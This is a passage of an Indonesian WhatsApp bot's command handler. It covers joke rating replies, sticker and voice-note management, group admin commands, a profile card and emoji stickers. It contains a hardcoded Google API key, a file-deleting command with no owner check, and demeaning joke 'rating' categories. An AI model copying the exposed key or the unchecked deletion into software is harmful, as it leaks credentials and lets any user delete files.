const apa =['iya dong jelas itu','Tidak lah','Oh tentu saja tidak','Ya mana saya tau kok tanya saya','Rahasia dong','ga usah di tanya emang udah kaya gitu dia','Au ah mending mandi','Bentar aku lagi berak','Knpa emang kamu suka sama dia yak ??','Haha mna mungkin 🤣']
const kah = apa[Math.floor(Math.random() * apa.length)]
xdev.sendMessage(from, { text: 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah}, { quoted: setQuoted })
break
case 'bagaimanakah':
const bagaimanakah = body.slice(0)
const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Gua tabok boleh ?','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan','Hah kamu tanya sama aku trus aku tanya ke siapa dong','Whahahaha ga tau 😑']
const mana = bagai[Math.floor(Math.random() * bagai.length)]
xdev.sendMessage(from, { text: 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana}, { quoted: setQuoted })
break													
case 'goblokcek': case 'jelekcek': case 'gaycek':case 'rate':
case 'lesbicek':case 'gantengcek': case 'cantikcek':case 'begocek': case 'suhucek':case 'pintercek':
case 'jagocek':case 'nolepcek':case 'babicek':case 'bebancek':case 'baikcek':
case 'jahatcek':case 'anjingcek':case 'haramcek':case 'pakboycek':
case 'pakgirlcek':case 'sangecek': case 'bapercek':case 'fakboycek':case 'alimcek':case 'suhucek':
case 'fakgirlcek':case 'kerencek':case 'wibucek':case 'pasarkascek':
const cex = body.slice(0)
const cek1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
xdev.sendMessage(from, { text: 'Pertanyaan : *'+cex+'*\n\nJawaban : '+ cek2+'%'}, { quoted: setQuoted })
break			
case 'watakcek': case 'cekwatak':
const watak = body.slice(0)
const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
const tak = wa[Math.floor(Math.random() * wa.length)]
xdev.sendMessage(from, { text: 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak}, { quoted: setQuoted })
break				
case 'hobbycek': case 'cekhobby':
const hobby = body.slice(0)
const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
const by = hob[Math.floor(Math.random() * hob.length)]
xdev.sendMessage(from, { text: 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by}, { quoted: setQuoted })
break




case 'clearallban':
if (!isOwner) return onlyOwner()
setReply("Sukses clear all ban")
clearAllBan(ban)
break 

case 'setnamebot':
if (!isOwner) return onlyOwner()
setReply(`Berhasil mengubah nama bot ke ${q}`)
fake = `${q}`
break

case 'setfakeimg':{
if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
if(isImage || isQuotedImage){
let delb = await xdev.downloadAndSaveMediaMessage(quoted)
await fse.copy(delb,`./stik/fake.jpeg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah fake image`)
} else {
setReply(`Kirim gambar dengan caption ${prefix}${command}`)
}
}
break	

case 'setthumb':{
if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
if(isImage || isQuotedImage){
let delb = await xdev.downloadAndSaveMediaMessage(quoted)
await fse.copy(delb,`./stik/thumb.jpeg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah thumbnail`)
} else {
setReply(`Kirim gambar dengan caption ${prefix}sethumb`);
}
}
break;




case 'setimgreply':{
if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
if(isImage || isQuotedImage){
let delb = await xdev.downloadAndSaveMediaMessage(quoted)
await fse.copy(delb,`./stik/reply.jpg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah image reply`)
} else {
setReply(`Kirim gambar dengan caption ${prefix}setimagereply`);
}
}
break;
        
        

case 'setimginfo':{
if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
if(isImage || isQuotedImage){
let delb = await xdev.downloadAndSaveMediaMessage(quoted)
await fse.copy(delb,`./stik/bot.jpg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah image pada infobotz`)
} else {
setReply(`Kirim gambar dengan caption ${prefix}setimageinfo`);
}
}
break;

case 'addvn':{
if (!dev.key.fromMe && !isOwner) return reply (mess.only.ownerB)
if (!isQuotedAudio) return setReply('Reply vnnya')
if (!q) return setReply('Nama audionya apa')
let delb = await xdev.downloadAndSaveMediaMessage(quoted)
audionye.push(q)
await fse.copy(delb,`./temp/audio/${q}.mp3`)
fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
fs.unlinkSync(delb)
setReply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break  

case 'delvn':{
if (!isOwner) return onlyOwner() 
try {
let wanu = audionye.indexOf(q)
audionye.splice(wanu, 1)
fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
fs.unlinkSync(`./temp/audio/${q}.mp3`)
setReply(`Sukses delete vn ${q}`)
} catch (err){
console.log(err)
setReply('eror kak')
}
}
break


  case 'addstik':{
if (!dev.key.fromMe && !isOwner) return reply (mess.only.owner)
if (!isQuotedSticker) return setReply('Reply stiker nya')
if (!q) return setReply('Nama sticker nya apa?')
for(let i of setiker){
if(i == q) return setReply("Nama tersebut sudah di gunakan")
}
let delb = await xdev.downloadAndSaveMediaMessage(quoted)
setiker.push(q) 
await fse.copy(delb, `./temp/stick/${q}.webp`)
fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
fs.unlinkSync(delb)
setReply(`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`)
}
break

				

case 'delstik':{
if(!dev.key.fromMe & !isOwner) return setReply('Only owner')
if (!q) return setReply("Masukan query")
try {
for(let i of setiker){
if(i !== q) return setReply("Nama tersebut tidak ada di dalam data base")
}
let wanu = setiker.indexOf(q)
setiker.splice(wanu,1)
fs.unlinkSync(`./temp/stick/${q}.webp`)
fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
setReply(`Succes delete sticker ${q}!`)
} catch (err) {
console.log(err)
setReply(`Gagal delete sticker ${q}!`)
}
}
break
    
case 'liststik':{
let teks = '*Sticker list :*\n\n'
for (let awokwkwk of setiker) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${setiker.length}*`
setReply(teks)
}
break
				
				
				
case 'listvn':
{
let teks = '*List Vn:*\n\n'
for (let awokwkwk of audionye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total ada : ${audionye.length}*`
teks += `\n\n*Untuk mengambil vn silakan ketik nama vn*`
setReply(teks)
}
break
        
case 'shutdown':
if (!isOwner && !itsMe) return setReply(mess.only.owner)
await xdev.sendMessage(from, {text: "_Shuting Down..._"})
await delay(3000)
await xdev.sendMessage(from, {text: "_Succes_"})
return await xdev.sendMessage(from, JSON.stringify(eval(process.exit())))
break

case 'patrick':
setReply(mess.wait)
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
xdev.sendImageAsSticker(from, pjr, dev)
}
)
break

case 'gura':
setReply(mess.wait)
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
xdev.sendImageAsSticker(from, pjr, dev)
}
)
break

case 'doge':
setReply(mess.wait)
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
//xdev.sendMedia (from, pjr, dev, {caption: "Nih"})
xdev.sendImageAsSticker(from, pjr, dev)
}
)
break

case 'restart':
if (!isOwner && !itsMe) return setReply(mess.only.owner)
await setReply(`_Restarting ${fake}_`)
exec(`cd && node index`)
await sleep(4000)
setReply('Sukses')
break

case 'me': {
let ppimg = await xdev.profilePictureUrl(sender, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
try{
 let sol = await xdev.fetchStatus(sender)
var stst = sol.status == undefined ? '' : sol.status 
} catch(err){
var stst = ""
  
}

let cekprm = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
let hituser = gethitUser(senderNumber, user)
let persenya =`${userPersen}`
let nana =`${userExp}/${requiredExp}`
if(isOwner){
    var prmm = isPremium ? `Unlimited`:'Not Premium'
    } else {
   var   prmm = isPremium ? `${cekprm.days} Hari ${cekprm.hours} Jam ${cekprm.minutes} Menit ${cekprm.seconds} Detik`:'Not Premium'
 }
 
let teks = `*]────「 Profile User 」────[*

🆔 Nama : ${pushname} 
💳 Saldo  : Rp ${getBalance(senderNumber, user)}
✅ Verified : ${userVerified}
📇 Status : ${isPremium ? 'Premium':'Free'}
🧬 Level : ${userLevel}
🔰 Pangkat : ${userLeveling(userLevel)}
⚡ Exp :  ${userXp(userPersen)} ${persenya.split(".")[0]}%
♻️ Total Exp : ${nana}
📟 User Hit : ${hituser}
🤖 Status Bot : ${isOwner ? 'Owner':'User'}
🕔 Expired : ${prmm}
📉 Limit : ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}
📈 Limit Game : ${cekGLimit(senderNumber, gcount, user)}/${gcounti.user}
📈 Limit Menfess : ${getTes(senderNumber, gcount, user)}

📲 No : wa.me/${sender.split("@")[0]}
🧸 Bio : ${stst}`


let its = await getBuffer (ppimg)

const canvacord = require("canvacord");
  let image3 = new canvacord.Rank()
  .setAvatar(its)
  .setCurrentXP(math(userExp))
  .setRequiredXP(requiredExp)
  .setStatus("online")
  .setProgressBar("#FFFFFF", "COLOR")
  .setBackground( "COLOR","#141414")
  .setCustomStatusColor("#ff1a8c")  
  .setUsername(`EXP: ${persenya.split(".")[0]}%,`)
  .setLevel(math(userLevel ))
  .setRank(4)
  .setOverlay("#3d3d3d")
  .setDiscriminator("0007");
  
  let foto = await getRandom(".png")
  image3.build()
  .then(async data => {
  await canvacord.write(data,foto);
  let gambar = await fs.readFileSync(foto)
  let butprofile = [{ buttonId: `${prefix}shop`, buttonText: { displayText: `sʜᴏᴘ` }, type: 1 },{ buttonId: `${prefix}claim`, buttonText: { displayText: `ᴄʟᴀɪᴍ` }, type: 1 } ];          
  let buttonMessage = {
  image:gambar,
  caption: teks,
  footer: copyright,
  buttons: butprofile,
  headerType: 4
  }
  
  await xdev.sendMessage(from, buttonMessage)
  await fs.unlinkSync(foto)
          });

}
 
break

case 'readmore':{
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
if (!q.includes('|')) return  setReply("Penggunaan teks| teks")
const text1 = q.substring(0, q.indexOf('|') - 0)
const text2 = q.substring(q.lastIndexOf('|') + 1)
setReply(`${text1}${readmore}${text2}`)
}
break



case 'buyglimit':
           case 'buygamelimit':
                       {
                       if(!q)return setReply(`Example : ${prefix + command} 10\n\nHarga 1 limit = Rp750`)
                       const koinPerlimit = 750
                       const total = koinPerlimit * q
                       if (getBalance(senderNumber, user) <= total) return setReply(`Maaf Saldo kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
                       kurangBalance(senderNumber, total, user)
                       givegame(senderNumber, math(q), user)
                       setReply(`Pembeliaan game limit sebanyak ${q} berhasil\n\nSisa Saldo : Rp${getBalance(senderNumber, user)}\nSisa Game Limit : ${cekGLimit(senderNumber, gcount, user)}/${gcount}`)
                       }
                       break
/////----------------------------------]]]-----------------------------------------------------------
case  'delsampah':{
let path = require('path');
let directoryPath = path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return setReply('Unable to scan directory: ' + err);
 } 
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("webp")    )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file sampah\n\n`
if(filteredArray.length == 0) return setReply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})
 
setReply(teks) 

await sleep(2000)
setReply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(file)
});
await sleep(2000)
setReply("Berhasil menghapus semua sampah")
 
});
  }
break

case 'clearalluser':
if (!isOwner) return onlyOwner()
setReply("Suksek clear all User")
clearAllUser(user)
break
  
case 'clearallblock':{
if (!isOwner) return onlyOwner()
let obj = [] 
fs.writeFileSync('./database/userblocked.json', JSON.stringify(obj))         
await setReply(`ALL USER BLOCKED BERHASIL DI HAPUS`)
}
break 

case 'setmenu':
    if(!isOwner) return onlyOwner()
    if ((args[0]) === 'katalog'|| (args[0]) === 'product' ){
		setmenu = "katalog"
        await xdev.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
		} else  if ((args[0]) === 'lokasi2'|| (args[0]) === 'prolocation2' ){
        setmenu = "location2"
        await xdev.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
        } else if ((args[0]) === 'image'|| (args[0]) === 'img' ){
        setmenu = "image"
        await xdev.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
        } else if ((args[0]) === 'lokasi' ){
        setmenu = "location"
        await xdev.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
                    } else if ((args[0]) === 'image2'|| (args[0]) === 'img2' ){
        setmenu = "image2"
        await xdev.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
        }else if ((args[0]) === 'pptx'){
        docType = "pptx"
        setmenu = "document"
        await xdev.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
        } else if ((args[0]) === 'xlsx'){
        docType = "xlsx"
        setmenu = "document"
        await xdev.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
    } else if ((args[0]) === 'zip'){
        docType = "zip"
        setmenu = "document"
        await xdev.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
        } else if ((args[0]) === 'pdf'){
        docType = "pdf"
        setmenu = "document"
        await xdev.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
    } else if ((args[0]) === 'docx'){
        docType = "docx"
        setmenu = "document"
        await xdev.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
    } else if ((args[0]) === 'gif'){
        setmenu = "gif"
        await xdev.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
    }  else if (!q) {
                      xdev.sendButMessage(from, `SETTING MENU\n1.lokasi\n2.lokasi2\n3.img\n4.Pptx\n5.Xlsx\n6.Zip\n7.Pdf\n8.Docx\n9.gif`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}setmenu katalog`, buttonText: {displayText: `ᴋᴀᴛᴀʟᴏɢ`},type: 1},
                      {buttonId: `${prefix}setmenu troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
                      {buttonId: `${prefix}setmenu lokasi`, buttonText: { displayText: `ʟᴏᴋᴀsɪ`},type: 1}],setQuoted);
                    } else {
                    setReply("Menu tidak di temukan om")
                    }
    break


case 'getppgc':
if (!isGroup) return 
setReply(mess.wait)
try {
var ppimg = await xdev.profilePictureUrl(from, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await xdev.sendMessage(from, { image: { url: ppimg }}, { quoted: dev })
break 


case 'getpp':
if (isGroup) { 
if(mentionByTag){
console.log(mentionByTag[0])
try {
var ppimg = await xdev.profilePictureUrl(mentionByTag[0],"image")
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await xdev.sendMessage(from, { caption: "Nih", image: { url: ppimg }}, { quoted: dev })

} else if (mentionByReply){
try {
var ppimg = await xdev.profilePictureUrl(mentionByReply, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await xdev.sendMessage(from, { contextInfo: { forwardingScore: 2, isForwarded: true },caption: "Nih", image: { url: ppimg }}, { quoted: dev })
} 
} else if(!isGroup){
try {
var ppimg = await xdev.profilePictureUrl(from, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await xdev.sendMessage(from, {caption: "Nih",  image: { url: ppimg }}, { quoted: dev })
}

break

    
case 'grupwa': 
if (!q) return reply(`Kirim perintah ${command} nama grup`)
setReply(mess.wait)
hxz.linkwa(q).then(async(data) => {
if (data.length == 0) return reply(`Grup ${q} tidak ditemukan`)
var teks = `*Hasil Pencarian Dari ${q}*\n\n`
for (let x of data) {
teks += `*Nama :* ${x.nama}\n*Link :* ${x.link}\n\n`
}
reply(teks)
}).catch(() => reply(mess.error.api))
break
			
			
			

			
case 'setnamegc':
if (!isGroup) return setReply(mess.only.group)
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
await xdev.groupUpdateSubject(from, q)
.then( res => {
setReply(`Sukses`)
}).catch(() => setReply(mess.error.api))
break

case 'setdesc': 
if (!isGroup) return setReply(mess.only.group)
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
await xdev.groupUpdateDescription(from, q)
.then( res => {
setReply(`Sukses`)
}).catch(() => reply(mess.error.api))
break
				
case 'gc':
if (!isGroup) return setReply(mess.only.group)
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if (!q) return reply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
if (args[0] == "close") {
xdev.groupSettingUpdate(from, 'announcement')
setReply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
} else if (args[0] == "open") {
xdev.groupSettingUpdate(from, 'not_announcement')
setReply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
} else {
setReply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
}
break

case 'revoke':
if (!isGroup) return setReply(mess.only.group)
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
await xdev.groupRevokeInvite(from)
.then( res => {
setReply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => reply(mess.error.api))
break
			

case 'status':{
let osu = require('node-os-utils')
    try {
        let NotDetect = 'Not Detect'
        let old = performance.now()
        let cpu = osu.cpu
        let cpuCore = cpu.count()
        let drive = osu.drive
        let mem = osu.mem
        let netstat = osu.netstat
        let OS = osu.os.platform()
        let cpuModel = cpu.model()
        let cpuPer
        let p1 = cpu.usage().then(cpuPercentage => {
            var cpuPer = cpuPercentage
        }).catch(() => {
            var cpuPer = NotDetect
        })
        let driveTotal, driveUsed, drivePer
        let p2 = drive.info().then(info => {
            driveTotal = (info.totalGb + ' GB'),
                driveUsed = info.usedGb,
                drivePer = (info.usedPercentage + '%')
        }).catch(() => {
            driveTotal = NotDetect,
                driveUsed = NotDetect,
                drivePer = NotDetect
        })
        let ramTotal, ramUsed
        let p3 = mem.info().then(info => {
            ramTotal = info.totalMemMb,
                ramUsed = info.usedMemMb
        }).catch(() => {
            ramTotal = NotDetect,
                ramUsed = NotDetect
        })
        let netsIn, netsOut
        let p4 = netstat.inOut().then(info => {
            netsIn = (info.total.inputMb + ' MB'),
                netsOut = (info.total.outputMb + ' MB')
        }).catch(() => {
            netsIn = NotDetect,
                netsOut = NotDetect
        })
        await Promise.all([p1, p2, p3, p4])
        await setReply(`_Testing ${command }..._`)
        let _ramTotal = (ramTotal + ' MB')
        let neww = performance.now()
        let teks =`
*「 Status 」*

OS : *${OS}*
CPU Model : *${cpuModel}*
CPU Core : *${cpuCore} Core*
CPU : *${cpuPer? `${cpuPer}%`:"Not Found"}*
Ram : *${ramUsed} / ${_ramTotal}(${/[0-9.+/]/g.test(ramUsed) &&  /[0-9.+/]/g.test(ramTotal) ? Math.round(100 * (ramUsed / ramTotal)) + '%' : NotDetect})*
Drive : *${driveUsed} / ${driveTotal} (${drivePer})*
Ping : *${Math.round(neww - old)} ms*
Internet IN : *${netsIn}*
Internet OUT : *${netsOut}*
`
let mok = [{"buttonId": `${prefix}infobotz`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}sewa`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]

xdev.sendButLoc(from, teks,copyright,fs.readFileSync('./stik/thumb.jpeg'), mok)
} catch (err) {
setReply(err)
}
}
 
break

			
case 'listonline': {
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(store.presences[id]), botNumber]
xdev.sendText(from, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, dev, { mentions: online })
}
break			
			
case 'wallpapermobile':{
let link =`https://megayaa.herokuapp.com/api/akaneko/mobileWallpapers`
let nana = await getBuffer(link)     
xdev.sendImage(from, nana, "Nih",dev)
}
break

case 'wallpapers':{
let link =`https://megayaa.herokuapp.com/api/akaneko/wallpapers`
let nana = await getBuffer(link)     
xdev.sendImage(from, nana, "Nih",dev)
}
break

case 'emojimix': {
let [emoji1, emoji2] = q.split`+`
if (!emoji1) return setReply( `Example : ${prefix + command} 😅+🤔`)
if (!emoji2) return setReply( `Example : ${prefix + command} 😅+🤔`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
await xdev.sendImageAsSticker(from, res.url, dev)
  //xdev.sendStimg(from, res.url, dev)
//await fs.unlinkSync(encmedia)
}
}
break

case 'getcaze':
case 'getcase':
try{
if (!dev.key.fromMe && !isOwner) return setReply(mess.owner)
if (!q) return setReply("*Mau nyari Case apa kak*") 
if(q.startsWith(prefix)) return setReply("Query tidak boleh menggunakan prefix")
let nana = await getCase(q)
setReply(nana)
} catch(err){
console.log(err)
setReply(`Case ${q} tidak di temukan`)
}
break
    
case 'emojiap':{
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Apple")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[0].url}`
xdev.sendImageAsSticker(from, teks, dev)
})
}
break	            

  case 'emojigo':{
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Google")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[1].url}`
xdev.sendImageAsSticker(from, teks, dev)
})
}
break	             

case 'emojisa':{
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Samsung")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[2].url}`
xdev.sendImageAsSticker(from, teks, dev)
})
}
break	             

case 'emojims':{
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Microsoft")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[3].url}`
xdev.sendImageAsSticker(from, teks, dev)
})
}
break	             

case 'emojiwa':{
if (!q) return setReply('emojinya?')
setReply("Converting to emoji WhatsApp")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[4].url}`
xdev.sendImageAsSticker(from, teks, dev)
})
}
break	

case 'emojitw':{
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Twitter")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[5].url}`
xdev.sendImageAsSticker(from, teks, dev)
})
}
break	

case 'emojifb':{
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Facebook")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[6].url}`
xdev.sendImageAsSticker(from, teks, dev)
})
}
break	


case 'emojijp':{
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji joypixel")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[7].url}`
 xdev.sendImageAsSticker(from, teks, dev)
})
}
break	       

case 'emojiom':{
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji openmoji")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[8].url}`
 xdev.sendImageAsSticker(from, teks, dev)
})
}
break	      



case 'emojied':{
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji emojidex")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[9].url}`
 xdev.sendImageAsSticker(from, teks, dev)
})
}
break	      

case 'emojimes':{
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji messenger")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[10].url}`
 xdev.sendImageAsSticker(from, teks, dev)
})
}
break	  

case 'emojilt':{
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji logitech")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[11].url}`
 xdev.sendImageAsSticker(from, teks, dev)
})
}
break	  

case 'emojimo':{
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji mozila")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[13].url}`
 xdev.sendImageAsSticker(from, teks, dev)
})
}
break	  

case 'autolevel':{
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (autoLevel) return setReply('Sudah aktif kak')
autoLevel = true
setReply("Sukses mengaktifkan auto level!");
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!autoLevel) return setReply('Sudah Mati')
autoLevel = false
setReply("Sukses mematikan auto level!");
} else if (!q) {
xdev.sendButMessage(from, `MODE AUTO LEVEL`, `Silahkan pilih salah satu`, [
 {buttonId: `${prefix}autolevel on`, buttonText: {displayText: On },type: 1},
